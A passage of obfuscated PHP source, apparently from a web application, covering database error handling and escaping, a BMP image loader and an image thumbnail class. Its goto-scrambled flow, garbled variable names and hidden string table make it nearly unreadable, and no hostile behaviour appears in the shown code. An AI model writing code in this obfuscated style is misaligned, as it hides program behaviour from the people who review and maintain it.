= null; } public function error() { $DÄÌ¨ÂŸÖÇ =& $_SERVER[»„]; $this->error = mysql_errno() . $DÄÌ¨ÂŸÖÇ[4] . mysql_error($this->_linkID); if ($DÄÌ¨ÂŸÖÇ[33] != $this->queryStr) { $this->error .= LNG($DÄÌ¨ÂŸÖÇ[45]) . $this->queryStr; } think_trace($this->error, $DÄÌ¨ÂŸÖÇ[33], $DÄÌ¨ÂŸÖÇ[46]); return $this->error; } public function escapeString($bª¾¤ò§éô) { if ($this->_linkID) { return mysql_real_escape_string($bª¾¤ò§éô, $this->_linkID); } else { return mysql_escape_string($bª¾¤ò§éô); } } public function parseKey(&$dÑğâá²Õè, $aŠ‚ÙÈ…ìØ = true) { $Aôœ¶ÎÄ¬ã =& $_SERVER[»„]; if ($aŠ‚ÙÈ…ìØ) { $dÑğâá²Õè = $this->parseKeyCheck($dÑğâá²Õè); } if ($dÑğâá²Õè != $Aôœ¶ÎÄ¬ã[172] && !preg_match($Aôœ¶ÎÄ¬ã[813], $dÑğâá²Õè)) { $dÑğâá²Õè = $Aôœ¶ÎÄ¬ã[814] . trim($dÑğâá²Õè, $Aôœ¶ÎÄ¬ã[814]) . $Aôœ¶ÎÄ¬ã[814]; } return $dÑğâá²Õè; } } goto dãŸƒ¥¤ˆÜ; EÈ…²î¨øù: class ImageGdBMP { public static function load($F¯ß˜¥í–İ) { $AÊøË¶µò = fopen($F¯ß˜¥í–İ, $_SERVER[»„][1488]); if ($AÊøË¶µò === !1) { return !1; } $aÛÃÏ½ÒĞ¬ = self::loadFromStream($AÊøË¶µò); fclose($AÊøË¶µò); return $aÛÃÏ½ÒĞ¬; } public static function loadFromStream($bÃÀ’Ô¥Ã†) { $bëÑ©™º¾ =& $_SERVER[»„]; $Eº•Üˆ‹† = fread($bÃÀ’Ô¥Ã†, 14); if ($Eº•Üˆ‹† === !1) { return !1; } if ($Eº•Üˆ‹†[0] != $bëÑ©™º¾[1800] || $Eº•Üˆ‹†[1] != $bëÑ©™º¾[1801]) { return !1; } $E¬„íÄÍ× = unpack($bëÑ©™º¾[1802] . $bëÑ©™º¾[1803] . $bëÑ©™º¾[1804] . $bëÑ©™º¾[1805] . $bëÑ©™º¾[1806], $Eº•Üˆ‹†); return self::loadFromStreamAndFileHeader($bÃÀ’Ô¥Ã†, $E¬„íÄÍ×); } public static function loadFromStreamAndFileHeader($eêí¿»”°Ø, array $cŠ¶Ì•›’) { goto C¿Úôîšª; C¿Úôîšª: $c²ÀÅÍ®³á =& $_SERVER[»„]; if ($cŠ¶Ì•›’[$c²ÀÅÍ®³á[384]] != 19778) { return !1; } $aÜ²ˆàšÖè = fread($eêí¿»”°Ø, 4); goto cğàãÃš©’; BÈÇ˜µ¶†Ù: if ($F‹¿ƒ‚á¿ == 1 || $F‹¿ƒ‚á¿ == 4 || $F‹¿ƒ‚á¿ == 8) { goto b‹¬½Ô‰““; DàÈ¯ôÒ±: $bîÖáˆ¤– = (1 << $F‹¿ƒ‚á¿) - 1 << $cÛ¼¾¼×òÙ; if ($c›ç…äÜ‚õ == 1 || $c›ç…äÜ‚õ == 2) { $AÅÅ‡ôƒØ™ = 0; $c²¶®«î‚¸ = $F‹¿ƒ‚á¿ >> 2 & 1; for (;;) { if ($AÅÅ‡ôƒØ™ < -1 || $AÅÅ‡ôƒØ™ > $Cùíçèã¡Ê || $bÅÉï³ŞË÷ < -1 || $bÅÉï³ŞË÷ > $aß«¶ŞÇòö) { imagedestroy($f÷ø‡É‡ÛŞ); return !1; } $aÜ²ˆàšÖè = fread($eêí¿»”°Ø, 1); if ($aÜ²ˆàšÖè === !1) { imagedestroy($f÷ø‡É‡ÛŞ); return !1; } switch ($aÜ²ˆàšÖè) { case $c²ÀÅÍ®³á[1825]: $aÜ²ˆàšÖè = fread($eêí¿»”°Ø, 1); if ($aÜ²ˆàšÖè === !1) { imagedestroy($f÷ø‡É‡ÛŞ); return !1; } switch ($aÜ²ˆàšÖè) { case $c²ÀÅÍ®³á[1825]: $bÅÉï³ŞË÷ += $bÄíŠÏØÑ»; $AÅÅ‡ôƒØ™ = 0; break; case $c²ÀÅÍ®³á[1827]: $bÅÉï³ŞË÷ = 0; $AÅÅ‡ôƒØ™ = 0; break 3; case $c²ÀÅÍ®³á[1828]: $aÜ²ˆàšÖè = fread($eêí¿»”°Ø, 2); if ($aÜ²ˆàšÖè === !1) { imagedestroy($f÷ø‡É‡ÛŞ); return !1; } list(, $aØùœ‚¤®•, $E¨Ø•Ãœã) = unpack($c²ÀÅÍ®³á[1829], $aÜ²ˆàšÖè); $AÅÅ‡ôƒØ™ += $aØùœ‚¤®•; $bÅÉï³ŞË÷ += $E¨Ø•Ãœã * $bÄíŠÏØÑ»; break; default: list(, $EŒ¤ƒ·ßÕË) = unpack($c²ÀÅÍ®³á[1830], $aÜ²ˆàšÖè); $a ô†Ê»‡Ü = ($EŒ¤ƒ·ßÕË >> $c²¶®«î‚¸) + ($EŒ¤ƒ·ßÕË & $c²¶®«î‚¸); $aÜ²ˆàšÖè = fread($eêí¿»”°Ø, $a ô†Ê»‡Ü + 1 & ~1); if ($aÜ²ˆàšÖè === !1) { imagedestroy($f÷ø‡É‡ÛŞ); return !1; } for ($D´Òå½Øµ = 0, $fš»Ğ‰À«’ = 0; $D´Òå½Øµ < $EŒ¤ƒ·ßÕË; ++$D´Òå½Øµ, ++$AÅÅ‡ôƒØ™, $fš»Ğ‰À«’ += $F‹¿ƒ‚á¿) { list(, $EŒŠ–¼°¡ç) = unpack($c²ÀÅÍ®³á[1830], $aÜ²ˆàšÖè[$fš»Ğ‰À«’ >> 3]); $cğÏ£Ø…ê” = $fš»Ğ‰À«’ & 7; imagesetpixel($f÷ø‡É‡ÛŞ, $AÅÅ‡ôƒØ™, $bÅÉï³ŞË÷, $fÛÄ×²Ü[($EŒŠ–¼°¡ç & $bîÖáˆ¤– >> $cğÏ£Ø…ê”) >> $cÛ¼¾¼×òÙ - $cğÏ£Ø…ê”]); } break; } break; default: $DŸ¹®î§à = fread($eêí¿»”°Ø, 1); if ($DŸ¹®î§à === !1) { imagedestroy($f÷ø‡É‡ÛŞ); return !1; } list(, $aÙäĞƒÙ, $EŒŠ–¼°¡ç) = unpack($c²ÀÅÍ®³á[1829], $aÜ²ˆàšÖè . $DŸ¹®î§à); for ($D´Òå½Øµ = 0, $fš»Ğ‰À«’ = 0; $D´Òå½Øµ < $aÙäĞƒÙ; ++$D´Òå½Øµ, ++$AÅÅ‡ôƒØ™, $fš»Ğ‰À«’ += $F‹¿ƒ‚á¿) { $cğÏ£Ø…ê” = $fš»Ğ‰À«’ & 7; imagesetpixel($f÷ø‡É‡ÛŞ, $AÅÅ‡ôƒØ™, $bÅÉï³ŞË÷, $fÛÄ×²Ü[($EŒŠ–¼°¡ç & $bîÖáˆ¤– >> $cğÏ£Ø…ê”) >> $cÛ¼¾¼×òÙ - $cğÏ£Ø…ê”]); } break; } } } else { for ($f•ß‘âÔ¯ = 0; $f•ß‘âÔ¯ < $eçí›À¹¹œ; ++$f•ß‘âÔ¯, $bÅÉï³ŞË÷ += $bÄíŠÏØÑ») { $aÜ²ˆàšÖè = fread($eêí¿»”°Ø, $dÁ™„½ŸĞ¼); if ($aÜ²ˆàšÖè === !1) { imagedestroy($f÷ø‡É‡ÛŞ); return !1; } $fš»Ğ‰À«’ = 0; for ($AÅÅ‡ôƒØ™ = 0; $AÅÅ‡ôƒØ™ < $Cùíçèã¡Ê; ++$AÅÅ‡ôƒØ™, $fš»Ğ‰À«’ += $F‹¿ƒ‚á¿) { list(, $EŒŠ–¼°¡ç) = unpack($c²ÀÅÍ®³á[1830], $aÜ²ˆàšÖè[$fš»Ğ‰À«’ >> 3]); $cğÏ£Ø…ê” = $fš»Ğ‰À«’ & 7; imagesetpixel($f÷ø‡É‡ÛŞ, $AÅÅ‡ôƒØ™, $bÅÉï³ŞË÷, $fÛÄ×²Ü[($EŒŠ–¼°¡ç & $bîÖáˆ¤– >> $cğÏ£Ø…ê”) >> $cÛ¼¾¼×òÙ - $cğÏ£Ø…ê”]); } } } goto FäÎ‡ÁëøÅ; b‹¬½Ô‰““: $f÷ø‡É‡ÛŞ = imagecreate($Cùíçèã¡Ê, $eçí›À¹¹œ); $Dˆ¢¬š”— = $C¸ìöÄâ« == 12 ? 3 : 4; $CÈá‹Œ©¢ = $B´µ×˜¤ëÒ ? $B´µ×˜¤ëÒ : pow(2, $F‹¿ƒ‚á¿); goto cğÅÓ´Ê½ù; cğÅÓ´Ê½ù: $fÛÄ×²Ü = array(); for ($D´Òå½Øµ = 0; $D´Òå½Øµ < $CÈá‹Œ©¢; ++$D´Òå½Øµ) { $aÜ²ˆàšÖè = fread($eêí¿»”°Ø, $Dˆ¢¬š”—); if ($aÜ²ˆàšÖè === !1) { imagedestroy($f÷ø‡É‡ÛŞ); return !1; } extract(unpack($c²ÀÅÍ®³á[1826], $aÜ²ˆàšÖè . $c²ÀÅÍ®³á[1825])); $fÛÄ×²Ü[] = imagecolorallocate($f÷ø‡É‡ÛŞ, $dá”¶æíƒÑ, $B¤µ‚ÍŒì¸, $cğÏ£Ø…ê”); } $cÛ¼¾¼×òÙ = 8 - $F‹¿ƒ‚á¿; goto DàÈ¯ôÒ±; FäÎ‡ÁëøÅ: } else { goto FÒ…İòŠº›; dîÙÃ£›¥¾: $dôê®ƒ±Ş = $E˜™÷Ôï ? 1 / $E˜™÷Ôï : 1; $bí°¤® ƒ = $A©Ì×‚ã¥Å ? 1 / $A©Ì×‚ã¥Å : 1; $FÇÇà¢í¬ = $D–»Ñ¾ÚŞ” ? 1 / $D–»Ñ¾ÚŞ” : 1; goto f‡Ò›ãØ; f‡Ò›ãØ: for ($f•ß‘âÔ¯ = 0; $f•ß‘âÔ¯ < $eçí›À¹¹œ; ++$f•ß‘âÔ¯, $bÅÉï³ŞË÷ += $bÄíŠÏØÑ») { $aÜ²ˆàšÖè = fread($eêí¿»”°Ø, $dÁ™„½ŸĞ¼); if ($aÜ²ˆàšÖè === !1) { imagedestroy($f÷ø‡É‡ÛŞ); return !1; } $fš»Ğ‰À«’ = 0; for ($AÅÅ‡ôƒØ™ = 0; $AÅÅ‡ôƒØ™ < $Cùíçèã¡Ê; ++$AÅÅ‡ôƒØ™, $fš»Ğ‰À«’ += $dåå¥¨ö‡) { list(, $EŒŠ–¼°¡ç) = unpack($c²ÀÅÍ®³á[1807], substr($aÜ²ˆàšÖè, $fš»Ğ‰À«’, $dåå¥¨ö‡) . $c²ÀÅÍ®³á[1831]); $DùÖ‡Õáòè = $EŒŠ–¼°¡ç & $f‹•Ÿ’ÚŞĞ; $dŞšÅ„¢ó† = $EŒŠ–¼°¡ç & $E˜™÷Ôï; $EÀ¸éÒÀ“á = $EŒŠ–¼°¡ç & $A©Ì×‚ã¥Å; $e°ë´íŒï = $EŒŠ–¼°¡ç & $D–»Ñ¾ÚŞ”; $b—¤ôÔ‹®¥ = $d›ÛÏğğ«Æ - (($DùÖ‡Õáòè << 7) - $DùÖ‡Õáòè) * $f†âØÑÙ; $dá”¶æíƒÑ = (($dŞšÅ„¢ó† << 8) - $dŞšÅ„¢ó†) * $dôê®ƒ±Ş; $B¤µ‚ÍŒì¸ = (($EÀ¸éÒÀ“á << 8) - $EÀ¸éÒÀ“á) * $bí°¤® ƒ; $cğÏ£Ø…ê” = (($e°ë´íŒï << 8) - $e°ë´íŒï) * $FÇÇà¢í¬; imagesetpixel($f÷ø‡É‡ÛŞ, $AÅÅ‡ôƒØ™, $bÅÉï³ŞË÷, $b—¤ôÔ‹®¥ << 24 | $dá”¶æíƒÑ << 16 | $B¤µ‚ÍŒì¸ << 8 | $cğÏ£Ø…ê”); } } imagealphablending($f÷ø‡É‡ÛŞ, !0); goto DÛÇÖ©‰Å; cº²Œ—Îö: $dåå¥¨ö‡ = $F‹¿ƒ‚á¿ >> 3; $d›ÛÏğğ«Æ = $f‹•Ÿ’ÚŞĞ ? 127 : 0; $f†âØÑÙ = $f‹•Ÿ’ÚŞĞ ? 1 / $f‹•Ÿ’ÚŞĞ : 1; goto dîÙÃ£›¥¾; FÒ…İòŠº›: $f÷ø‡É‡ÛŞ = imagecreatetruecolor($Cùíçèã¡Ê, $eçí›À¹¹œ); imagealphablending($f÷ø‡É‡ÛŞ, !1); if ($f‹•Ÿ’ÚŞĞ) { imagesavealpha($f÷ø‡É‡ÛŞ, !0); } goto cº²Œ—Îö; DÛÇÖ©‰Å: } return $f÷ø‡É‡ÛŞ; goto a•¶»”Š˜ó; C†ÇåöÚŒî: if ($Cùíçèã¡Ê == 0 || $aß«¶ŞÇòö == 0 || $DïóÁÖÏÏ != 1 || ($f‹•Ÿ’ÚŞĞ & $E˜™÷Ôï) != 0 || ($f‹•Ÿ’ÚŞĞ & $A©Ì×‚ã¥Å) != 0 || ($f‹•Ÿ’ÚŞĞ & $D–»Ñ¾ÚŞ”) != 0 || ($E˜™÷Ôï & $A©Ì×‚ã¥Å) != 0 || ($E˜™÷Ôï & $D–»Ñ¾ÚŞ”) != 0 || ($A©Ì×‚ã¥Å & $D–»Ñ¾ÚŞ”) != 0) { return !1; } if ($c›ç…äÜ‚õ == 4 || $c›ç…äÜ‚õ == 5) { $aÜ²ˆàšÖè = stream_get_contents($eêí¿»”°Ø, $D÷Ø²Øñ); if ($aÜ²ˆàšÖè === !1) { return !1; } return imagecreatefromstring($aÜ²ˆàšÖè); } $dÁ™„½ŸĞ¼ = $Cùíçèã¡Ê * $F‹¿ƒ‚á¿ + 31 >> 3 & ~3; goto EÜø‡ïõÎ‚; EÜø‡ïõÎ‚: $eçí›À¹¹œ = abs($aß«¶ŞÇòö); $bÅÉï³ŞË÷ = $aß«¶ŞÇòö > 0 ? $eçí›À¹¹œ - 1 : 0; $bÄíŠÏØÑ» = $aß«¶ŞÇòö > 0 ? -1 : 1; goto BÈÇ˜µ¶†Ù; cğàãÃš©’: if ($aÜ²ˆàšÖè === !1) { return !1; } list(, $C¸ìöÄâ«) = unpack($c²ÀÅÍ®³á[1807], $aÜ²ˆàšÖè); if ($C¸ìöÄâ« == 12) { goto c«…‹©ù£; FÒÜÅñ“¡„: $D–»Ñ¾ÚŞ” = 255; goto C¬Ş—”; c«…‹©ù£: $aÜ²ˆàšÖè = fread($eêí¿»”°Ø, $C¸ìöÄâ« - 4); if ($aÜ²ˆàšÖè === !1) { return !1; } extract(unpack($c²ÀÅÍ®³á[1808] . $c²ÀÅÍ®³á[1809] . $c²ÀÅÍ®³á[1810] . $c²ÀÅÍ®³á[1811], $aÜ²ˆàšÖè)); goto DÂƒÄÌÄ‚; DÂƒÄÌÄ‚: $B´µ×˜¤ëÒ = $b™ªÙÇ©É = $f‹•Ÿ’ÚŞĞ = $c›ç…äÜ‚õ = 0; $E˜™÷Ôï = 16711680; $A©Ì×‚ã¥Å = 65280; goto FÒÜÅñ“¡„; C¬Ş—”: } else { if (124 < $C¸ìöÄâ« || $C¸ìöÄâ« < 40) { return !1; } else { goto A†°ŠŒÁ…é; A£¯ÈÜ‚êø: if ($Cùíçèã¡Ê & 2147483648) { $Cùíçèã¡Ê = -(~$Cùíçèã¡Ê & 4294967295) - 1; } if ($aß«¶ŞÇòö & 2147483648) { $aß«¶ŞÇòö = -(~$aß«¶ŞÇòö & 4294967295) - 1; } if ($cÜÛæ¦ˆãö & 2147483648) { $cÜÛæ¦ˆãö = -(~$cÜÛæ¦ˆãö & 4294967295) - 1; } goto AƒêÎË¬¤¸; eööÖƒ·: if (($F‹¿ƒ‚á¿ == 16 || $F‹¿ƒ‚á¿ == 24 || $F‹¿ƒ‚á¿ == 32) && $c›ç…äÜ‚õ == 0 && $E˜™÷Ôï == 0 && $A©Ì×‚ã¥Å == 0 && $D–»Ñ¾ÚŞ” == 0) { switch ($F‹¿ƒ‚á¿) { case 16: $E˜™÷Ôï = 31744; $A©Ì×‚ã¥Å = 992; $D–»Ñ¾ÚŞ” = 31; break; case 24: case 32: $E˜™÷Ôï = 16711680; $A©Ì×‚ã¥Å = 65280; $D–»Ñ¾ÚŞ” = 255; break; } } goto Cß­çÒ½; AƒêÎË¬¤¸: if ($b„œ¶¨°Ÿë & 2147483648) { $b„œ¶¨°Ÿë = -(~$b„œ¶¨°Ÿë & 4294967295) - 1; } if ($cŠ¶Ì•›’[$c²ÀÅÍ®³á[516]] != 0) { $EÌÁ¢™ÛÌ© = $F‹¿ƒ‚á¿ == 1 || $F‹¿ƒ‚á¿ == 4 || $F‹¿ƒ‚á¿ == 8 ? ($B´µ×˜¤ëÒ ? $B´µ×˜¤ëÒ : pow(2, $F‹¿ƒ‚á¿)) << 2 : 0; $FæŸ…ÆÏİ¡ = $D÷Ø²Øñ ? $D÷Ø²Øñ : ($Cùíçèã¡Ê * $F‹¿ƒ‚á¿ + 31 >> 3 & ~3) * abs($aß«¶ŞÇòö); $aÌÙ¡…¶ã¡ = $cŠ¶Ì•›’[$c²ÀÅÍ®³á[516]] - $FæŸ…ÆÏİ¡ - $EÌÁ¢™ÛÌ© - 14; if ($C¸ìöÄâ« < $aÌÙ¡…¶ã¡ && 40 <= $C¸ìöÄâ« && $C¸ìöÄâ« <= 124) { $C¸ìöÄâ« = $aÌÙ¡…¶ã¡; } } if ($C¸ìöÄâ« - 40 > 0) { $aÜ²ˆàšÖè = fread($eêí¿»”°Ø, $C¸ìöÄâ« - 40); if ($aÜ²ˆàšÖè === !1) { return !1; } extract(unpack($c²ÀÅÍ®³á[1821] . $c²ÀÅÍ®³á[1822] . $c²ÀÅÍ®³á[1823] . $c²ÀÅÍ®³á[1824], $aÜ²ˆàšÖè . str_repeat($c²ÀÅÍ®³á[1825], 120))); } else { $f‹•Ÿ’ÚŞĞ = $E˜™÷Ôï = $A©Ì×‚ã¥Å = $D–»Ñ¾ÚŞ” = 0; } goto eööÖƒ·; A†°ŠŒÁ…é: $aÜ²ˆàšÖè = fread($eêí¿»”°Ø, 36); if ($aÜ²ˆàšÖè === !1) { return !1; } extract(unpack($c²ÀÅÍ®³á[1812] . $c²ÀÅÍ®³á[1813] . $c²ÀÅÍ®³á[1810] . $c²ÀÅÍ®³á[1814] . $c²ÀÅÍ®³á[1815] . $c²ÀÅÍ®³á[1816] . $c²ÀÅÍ®³á[1817] . $c²ÀÅÍ®³á[1818] . $c²ÀÅÍ®³á[1819] . $c²ÀÅÍ®³á[1820], $aÜ²ˆàšÖè)); goto A£¯ÈÜ‚êø; Cß­çÒ½: } } goto C†ÇåöÚŒî; a•¶»”Š˜ó: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($CÃ‡£À¹„, $EÛ¸åÔ²ê) { goto aç¾¨¤¢×Ï; fïöÒğº: if (!$this->im) { return !1; } $D•¦ã×‰òá = $_SERVER[»„][33]; $this->imgData = GetImageSize($CÃ‡£À¹„, $D•¦ã×‰òá); goto cƒèÏ„°Ó²; cƒèÏ„°Ó²: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto a¬ŒâãƒÌÊ; aç¾¨¤¢×Ï: $this->srcFile = $CÃ‡£À¹„; $this->echoType = $EÛ¸åÔ²ê; $this->im = self::image($CÃ‡£À¹„); goto fïöÒğº; a¬ŒâãƒÌÊ: } public static function image($bô÷§Š…ÒÎ) { $bËÎÖŒçŠ‘ =& $_SERVER[»„]; $F³­ç¸êÑ– = $bËÎÖŒçŠ‘[33]; $Aƒ¿ª¶õ = GetImageSize($bô÷§Š…ÒÎ, $F³­ç¸êÑ–); $A„°äÌİß = !1; switch ($Aƒ¿ª¶õ[2]) { case IMAGETYPE_GIF: if (!function_exists($bËÎÖŒçŠ‘[1832])) { break; } $A„°äÌİß = imagecreatefromgif($bô÷§Š…ÒÎ); break; case IMAGETYPE_JPEG: if (!function_exists($bËÎÖŒçŠ‘[1833])) { break; } $A„°äÌİß = imagecreatefromjpeg($bô÷§Š…ÒÎ); break; case IMAGETYPE_PNG: if (!function_exists($bËÎÖŒçŠ‘[1834])) { break; } $A„°äÌİß = @imagecreatefrompng($bô÷§Š…ÒÎ); imagesavealpha($A„°äÌİß, !0); break; case IMAGETYPE_XBM: $A„°äÌİß = imagecreatefromxbm($bô÷§Š…ÒÎ); break; case IMAGETYPE_WBMP: $A„°äÌİß = imagecreatefromwbmp($bô÷§Š…ÒÎ); break; case IMAGETYPE_BMP: $A„°äÌİß = imagecreatefrombmp($bô÷§Š…ÒÎ); break; default: break; } return $A„°äÌİß; } public static function imageSize($aÉÏÈ˜íŞ„) { $A³Šì ª³´ =& $_SERVER[»„]; $eøã›£è‡½ = GetImageSize($aÉÏÈ˜íŞ„); if (!$eøã›£è‡½) { return !1; } return array($A³Šì ª³´[1835] => $eøã›£è‡½[0], $A³Šì ª³´[1836] => $eøã›£è‡½[1]); } function distortion($b‚Õ…šâã, $e…Ù±Ê‡·õ, $Cóİ±ğÆà”) { $F˜¢İÔ£ = $this->creatImage($this->im, $e…Ù±Ê‡·õ, $Cóİ±ğÆà”, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($F˜¢İÔ£, $b‚Õ…šâã); } function prorate($D×ÌÃğÚ›, $e¼²åä›ÍÊ, $a–²‰¬Ã‚œ) { $fÆÕÆîµœ = $e¼²åä›ÍÊ / $a–²‰¬Ã‚œ; $Eµïíñ = $this->srcW / $this->srcH; if ($fÆÕÆîµœ <= $Eµïíñ) { $BÜÀ‹¦˜î‹ = $e¼²åä›ÍÊ; $Fº‚ØÇ = $BÜÀ‹¦˜î‹ * ($this->srcH / $this->srcW); } else { $Fº‚ØÇ = $a–²‰¬Ã‚œ; $BÜÀ‹¦˜î‹ = $Fº‚ØÇ * ($this->srcW / $this->srcH); } if ($this->srcW > $e¼²åä›ÍÊ || $this->srcH > $a–²‰¬Ã‚œ) { $D›¢õ“­ˆŞ = $this->creatImage($this->im, $BÜÀ‹¦˜î‹, $Fº‚ØÇ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($D›¢õ“­ˆŞ, $D×ÌÃğÚ›); } else { $D›¢õ“­ˆŞ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($D›¢õ“­ˆŞ, $D×ÌÃğÚ›); } } function cut($bÍ¦Â½, $AÓ™Ë²½ğ, $aé©¸–Ì) { goto Eº÷ò‹‰Ü; d¯•‡ñ”ßâ: $a‹ÉñŞ§ò = $this->creatImage($this->im, $fôÖÄÔİ¤, $EÙò‚×¥¾ò, 0, 0, 0, 0, $this->srcW, $this->srcH); $b´µ™½ğæÓ = $this->creatImage($a‹ÉñŞ§ò, $AÓ™Ë²½ğ, $aé©¸–Ì, 0, 0, ($fôÖÄÔİ¤ - $AÓ™Ë²½ğ) / 2, ($EÙò‚×¥¾ò - $aé©¸–Ì) / 2, $AÓ™Ë²½ğ, $aé©¸–Ì); imageDestroy($a‹ÉñŞ§ò); goto Fè§¾ÚÌ“; Fè§¾ÚÌ“: return $this->echoImage($b´µ™½ğæÓ, $bÍ¦Â½); goto dó’ÅÄªÇˆ; Eº÷ò‹‰Ü: $f‡ÆŞ‡ß“Û = $AÓ™Ë²½ğ / $aé©¸–Ì; $BŠŞöŒå¡¸ = $this->srcW / $this->srcH; if ($f‡ÆŞ‡ß“Û <= $BŠŞöŒå¡¸) { $EÙò‚×¥¾ò = $aé©¸–Ì; $fôÖÄÔİ¤ = $EÙò‚×¥¾ò * ($this->srcW / $this->srcH); } else { $fôÖÄÔİ¤ = $AÓ™Ë²½ğ; $EÙò‚×¥¾ò = $fôÖÄÔİ¤ * ($this->srcH / $this->srcW); } goto d¯•‡ñ”ßâ; dó’ÅÄªÇˆ: } function backFill($f´¢ç·Ç¸, $FÂ¸©æ…š¤, $a¹Ì‡Óòê, $F·Ê²ŠêÙ´ = false, $f²šÌ÷â¸ = 255, $B½»„¢»¬ = 255, $eª±Í–°ƒ = 255) { goto C¸ëÂ½ËìÚ; C¸ëÂ½ËìÚ: $A—¥‘™Œ– = $FÂ¸©æ…š¤ / $a¹Ì‡Óòê; $Fš»ÎÃ¼‚Ä = $this->srcW / $this->srcH; if ($A—¥‘™Œ– <= $Fš»ÎÃ¼‚Ä) { $fõËì–óŸµ = $FÂ¸©æ…š¤; $a‡£‹÷±À  = $fõËì–óŸµ * ($this->srcH / $this->srcW); } else { $a‡£‹÷±À  = $a¹Ì‡Óòê; $fõËì–óŸµ = $a‡£‹÷±À  * ($this->srcW / $this->srcH); } goto bĞ Çìê×å; DÇÌçæ¥¦: if ($F·Ê²ŠêÙ´) { $AŸ‹ï‚Ù = imageColorTransparent($B’”ºŞ„Èâ, $AŸ‹ï‚Ù); $dÑ¾ƒ»ÍÄ = $a¹Ì‡Óòê - $a‡£‹÷±À ; } imageFilledRectangle($B’”ºŞ„Èâ, 0, 0, $FÂ¸©æ…š¤, $a¹Ì‡Óòê, $AŸ‹ï‚Ù); if ($this->srcW > $FÂ¸©æ…š¤ || $this->srcH > $a¹Ì‡Óòê) { $Eæ¸ÁÅ³„ = $this->creatImage($this->im, $fõËì–óŸµ, $a‡£‹÷±À , 0, 0, 0, 0, $this->srcW, $this->srcH); if ($fõËì–óŸµ < $FÂ¸©æ…š¤) { imageCopy($B’”ºŞ„Èâ, $Eæ¸ÁÅ³„, ($FÂ¸©æ…š¤ - $fõËì–óŸµ) / 2, 0, 0, 0, $fõËì–óŸµ, $a‡£‹÷±À ); } else { if ($a‡£‹÷±À  < $a¹Ì‡Óòê) { imageCopy($B’”ºŞ„Èâ, $Eæ¸ÁÅ³„, 0, $dÑ¾ƒ»ÍÄ, 0, 0, $fõËì–óŸµ, $a‡£‹÷±À ); } else { imageCopy($B’”ºŞ„Èâ, $Eæ¸ÁÅ³„, 0, 0, 0, 0, $fõËì–óŸµ, $a‡£‹÷±À ); } } } else { imageCopyMerge($B’”ºŞ„Èâ, $this->im, ($FÂ¸©æ…š¤ - $fõËì–óŸµ) / 2, $dÑ¾ƒ»ÍÄ, 0, 0, $fõËì–óŸµ, $a‡£‹÷±À , 100); } goto A«ùë˜˜”‚; bĞ Çìê×å: if (function_exists($_SERVER[»„][1837])) { @($B’”ºŞ„Èâ = imageCreateTrueColor($FÂ¸©æ…š¤, $a¹Ì‡Óòê)); if (!$B’”ºŞ„Èâ) { $B’”ºŞ„Èâ = imageCreate($FÂ¸©æ…š¤, $a¹Ì‡Óòê); } } else { $B’”ºŞ„Èâ = imageCreate($FÂ¸©æ…š¤, $a¹Ì‡Óòê); } $dÑ¾ƒ»ÍÄ = ($a¹Ì‡Óòê - $a‡£‹÷±À ) / 2; $AŸ‹ï‚Ù = imagecolorallocate($B’”ºŞ„Èâ, $f²šÌ÷â¸, $B½»„¢»¬, $eª±Í–°ƒ); goto DÇÌçæ¥¦; A«ùë˜˜”‚: return $this->echoImage($B’”ºŞ„Èâ, $f´¢ç·Ç¸); goto a¼ÓÕ±â ²; a¼ÓÕ±â ²: } function creatImage($Bšä†‘‘÷Ñ, $A˜óòäÇçà, $f‰ÓµÙÚ™Ï, $D…«ùô¨Ò, $B¿èŠ‹£…, $E­ëåê«‡Î, $D¬–Ö¯èŒ, $c“¹ù«Ò–Ù, $dÉÕ‚á‘ğ) { if (function_exists($_SERVER[»„][1837])) { @($F•ôĞ¤ƒ®‰ = ImageCreateTrueColor($A˜óòäÇçà, $f‰ÓµÙÚ™Ï)); @imagealphablending($F•ôĞ¤ƒ®‰, !1); @imagesavealpha($F•ôĞ¤ƒ®‰, !0); if ($F•ôĞ¤ƒ®‰) { imageCopyResampled($F•ôĞ¤ƒ®‰, $Bšä†‘‘÷Ñ, $D…«ùô¨Ò, $B¿èŠ‹£…, $E­ëåê«‡Î, $D¬–Ö¯èŒ, $A˜óòäÇçà, $f‰ÓµÙÚ™Ï, $c“¹ù«Ò–Ù, $dÉÕ‚á‘ğ); } else { $F•ôĞ¤ƒ®‰ = ImageCreate($A˜óòäÇçà, $f‰ÓµÙÚ™Ï); imageCopyResized($F•ôĞ¤ƒ®‰, $Bšä†‘‘÷Ñ, $D…«ùô¨Ò, $B¿èŠ‹£…, $E­ëåê«‡Î, $D¬–Ö¯èŒ, $A˜óòäÇçà, $f‰ÓµÙÚ™Ï, $c“¹ù«Ò–Ù, $dÉÕ‚á‘ğ); } } else { $F•ôĞ¤ƒ®‰ = ImageCreate($A˜óòäÇçà, $f‰ÓµÙÚ™Ï); imageCopyResized($F•ôĞ¤ƒ®‰, $Bšä†‘‘÷Ñ, $D…«ùô¨Ò, $B¿èŠ‹£…, $E­ëåê«‡Î, $D¬–Ö¯èŒ, $A˜óòäÇçà, $f‰ÓµÙÚ™Ï, $c“¹ù«Ò–Ù, $dÉÕ‚á‘ğ); } return $F•ôĞ¤ƒ®‰; } public function imgRotate($Aæ†¡ç¾Å¬, $aùŸÌ„˜) { goto c×ÜŸË…œ; A¢î‘±Ë˜‰: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $DŒùÃ‘‘„˜ = imagegif($b»æ¦´áÖÑ, $Aæ†¡ç¾Å¬); break; case IMAGETYPE_JPEG: $DŒùÃ‘‘„˜ = imagejpeg($b»æ¦´áÖÑ, $Aæ†¡ç¾Å¬, 100); break; case IMAGETYPE_PNG: $DŒùÃ‘‘„˜ = imagePNG($b»æ¦´áÖÑ, $Aæ†¡ç¾Å¬); break; default: break; } imageDestroy($b»æ¦´áÖÑ); imageDestroy($this->im); goto AÒ†¬‹ßøƒ; c×ÜŸË…œ: if (!$this->im || $aùŸÌ„˜ % 360 === 0 || !function_exists($_SERVER[»„][1838])) { return !1; } $b»æ¦´áÖÑ = imageRotate($this->im, 360 - $aùŸÌ„˜, 0); $DŒùÃ‘‘„˜ = !1; goto 